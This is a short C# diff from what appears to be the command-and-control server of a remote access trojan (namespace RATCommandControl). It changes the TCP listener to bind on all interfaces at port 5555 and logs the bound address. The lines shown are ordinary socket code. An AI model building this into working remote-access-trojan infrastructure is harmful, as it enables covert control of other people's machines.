@@ -22,9 +22,11 @@ namespace RATCommandControl
             int port = 5555;
             byte[] incomingBytes = new byte[1024];
             IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
-            IPAddress ipAddress = ipHostInfo.AddressList[0];
+            //IPAddress ipAddress = ipHostInfo.AddressList[1];
+            IPAddress ipAddress = IPAddress.Parse("0.0.0.0");
             IPEndPoint server = new IPEndPoint(ipAddress, port);
             Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+            Console.WriteLine("Command/Control binding to {0}:{1}", ipAddress.MapToIPv4().ToString(), port);
             listener.Bind(server);
             listener.Listen(10);
             while (true)
